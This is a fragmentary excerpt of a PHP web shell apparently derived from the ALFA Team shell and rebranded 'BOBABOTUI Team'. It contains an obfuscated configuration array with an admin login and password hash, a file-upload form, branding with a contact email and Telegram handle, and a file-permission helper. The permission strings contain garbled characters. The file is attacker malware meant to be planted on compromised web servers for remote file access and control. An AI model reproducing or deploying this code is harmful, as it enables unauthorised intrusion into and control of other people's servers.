...
$GLOBALS['oZgNypoPRU'] = array(
	'usgytpFkh' => 'admin',
	'palWPdgjTXOHXXOD' => 'ceb3e8ff356c28b5b00fc9b77709f35d', //
	'saefHqYkzpt' => '1',
	'loVXxveqHpqlKR' => 'gui',
	'shaUGtAh' => '1',
...
<center><img style="border-radius:100px;" width="500" height="250" alt="alfa team 2012" draggable="false" src="https://i.ibb.co/SmfgbSp/photo-2023-12-18-12-43-33.jpg" /></center>
...
<td width="12%" rowspan="8"><img style="border-radius:100px;" width="300" height="170" alt="alfa team 2012" draggable="false" src="https://i.ibb.co/SmfgbSp/photo-2023-12-18-12-43-33.jpg" /></td>
</tr>
<tr>
...
if(empty($about_us)){
$about_us = "<pre><center><img src='https://i.ibb.co/SmfgbSp/photo-2023-12-18-12-43-33.jpg'><br>
...
<span class='footer_text'>Upload file: </span><span><button id='addup' onclick='addnewup();return false;'><b>+</b></button></span><p id='pfooterup'><label class='inputfile' for='footerup'><span id='__fnameup'></span> <strong>&nbsp;&nbsp;Choose a file</strong></label><input id='footerup' class='toolsInp' type='file' name='f[]' onChange='handleup(this,0);' multiple></p><input type='submit' name='submit' value=' '></form><div id='alfa-copyright'><span class='copyright'>[ ./BOBABOTUI Team &copy; 2016-".date('Y')." ]</span><br><span> <span style='letter-spacing: 2px;color: #dfff00;'>dhpriv8@gmail.com</span> <span><a style='color: #ff6060;text-decoration: none;' target='_blank' href='https://telegram.me/penguinsalju'>@penguinsalju</a></span></div></td>
</tr>
</table>
</div>
...
if (($p & 0xC000) == 0xC000)$i = 'sโ€';
elseif (($p & 0xA000) == 0xA000)$i = 'lโ€';
elseif (($p & 0x8000) == 0x8000)$i = '-โ€';
elseif (($p & 0x6000) == 0x6000)$i = 'bโ€';
elseif (($p & 0x4000) == 0x4000)$i = 'dโ€';
elseif (($p & 0x2000) == 0x2000)$i = 'cโ€';
elseif (($p & 0x1000) == 0x1000)$i = 'pโ€';
else $i = 'uโ€';
$i .= (($p & 0x0100) ? 'rโ€' : '-');
$i .= (($p & 0x0080) ? 'wโ€' : '-');
$i .= (($p & 0x0040) ? (($p & 0x0800) ? 'sโ€' : 'xโ€' ) : (($p & 0x0800) ? 'Sโ€' : '-'));
$i .= (($p & 0x0020) ? 'rโ€' : '-');
$i .= (($p & 0x0010) ? 'wโ€' : '-');
$i .= (($p & 0x0008) ? (($p & 0x0400) ? 'sโ€' : 'xโ€' ) : (($p & 0x0400) ? 'Sโ€' : '-'));
$i .= (($p & 0x0004) ? 'rโ€' : '-');
$i .= (($p & 0x0002) ? 'wโ€' : '-');
$i .= (($p & 0x0001) ? (($p & 0x0200) ? 'tโ€' : 'xโ€' ) : (($p & 0x0200) ? 'Tโ€' : '-'));
return $i;
}
...
echo("<tr><td><b><fontcolor=\"#67ABDF\">Value</font></td><td>$value</td></tr></b>");
echo "</table><br><br></center>";
}
}
